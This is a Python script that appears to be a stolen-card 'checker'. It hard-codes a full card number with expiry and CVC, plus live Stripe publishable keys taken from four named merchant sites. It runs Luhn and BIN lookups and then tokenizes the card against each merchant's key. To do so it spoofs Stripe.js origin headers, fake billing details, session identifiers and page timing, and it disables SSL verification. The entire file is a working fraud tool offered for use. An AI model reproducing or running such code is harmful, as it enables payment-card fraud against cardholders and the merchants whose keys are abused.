# language: Python 3.12+, file: check_single_card.py, target: Windows 11
import asyncio
import json
import uuid
import aiohttp

CARD_RAW = "5175465382242090|09|2030|018"

KEYS = {
    "thetrendywhippet.co.uk": "pk_live_51Jp9wuK3YdHkHNEh41rHIvuKpHsPlqXMNzWj3cHURKSlzRs561KNRtTwXXUn5FOyVIX4U97Gpf8MKfuRqkLnmBWX00xv4jEjy3",
    "rocketgeek.com": "pk_live_5153BeCDTX57OKyr3c3ek7Jih2B1eDlPr2KBHGrQOKCxOflJG5Z98BwUtq0siI28cPm61QO3v5bPuQoIykddn7Gw800ihOJNT4B",
    "wisdomofplanets.com": "pk_live_51PLMKYAH7opD6dQYmoFqwAem5u09mmcTWN3xm2h4SY2DelpDKlGJ6zwhvMytaLeu6qlXOWfcAeUBYVI1yt1z4Rhe00QnBB6js1",
    "lifterlms.com": "pk_live_sRzjA5xTx7W355R2IY8oIZCs",
}

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

def check_luhn(card_num: str) -> bool:
    digits = [int(d) for d in card_num if d.isdigit()]
    checksum = 0
    reverse_digits = digits[::-1]
    for i, d in enumerate(reverse_digits):
        if i % 2 == 1:
            doubled = d * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += d
    return checksum % 10 == 0

async def bin_lookup(bin_num: str) -> dict:
    headers = {"Accept-Version": "3", "User-Agent": "Mozilla/5.0"}
    async with aiohttp.ClientSession(headers=headers) as s:
        try:
            async with s.get(f"https://lookup.binlist.net/{bin_num}", timeout=aiohttp.ClientTimeout(total=5)) as r:
                if r.status == 200:
                    return await r.json()
        except Exception:
            pass
        try:
            async with s.get(f"https://data.handyapi.com/bin/{bin_num}", timeout=aiohttp.ClientTimeout(total=5)) as r:
                if r.status == 200:
                    return await r.json()
        except Exception:
            pass
    return {}

async def tokenize(session, site, pk, num, mm, yy, cvc):
    body = {
        "type": "card",
        "billing_details[name]": "Alex Taylor",
        "billing_details[address][line1]": "123 Main St",
        "billing_details[address][postal_code]": "10001",
        "billing_details[address][city]": "New York",
        "billing_details[address][state]": "NY",
        "billing_details[address][country]": "US",
        "card[number]": num,
        "card[cvc]": cvc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": str(uuid.uuid4()),
        "muid": str(uuid.uuid4()),
        "sid": str(uuid.uuid4()),
        "pasted_fields": "number,cvc",
        "payment_user_agent": "stripe.js/916d815941; stripe-js-v3/916d815941; payment-element; deferred-intent",
        "referrer": f"https://{site}",
        "time_on_page": "45000",
        "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "key": pk,
    }
    headers = {
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
    }
    try:
        async with session.post("https://api.stripe.com/v1/payment_methods", data=body, headers=headers, ssl=False) as r:
            return await r.json(content_type=None)
    except Exception as e:
        return {"error": {"message": str(e)}}

async def main():
    parts = CARD_RAW.strip().split("|")
    num = parts[0]
    mm = parts[1].zfill(2)
    yy = "20" + parts[2][-2:]
    cvc = parts[3]

    luhn_ok = check_luhn(num)
    binfo = await bin_lookup(num[:6])

    print(json.dumps({
        "card": CARD_RAW,
        "luhn": luhn_ok,
        "bin_data": binfo
    }))

    async with aiohttp.ClientSession(headers={"User-Agent": UA}) as s:
        for site, pk in KEYS.items():
            res = await tokenize(s, site, pk, num, mm, yy, cvc)
            print(f"MERCHANT: {site} -> {json.dumps(res)}")

if __name__ == "__main__":
    asyncio.run(main())
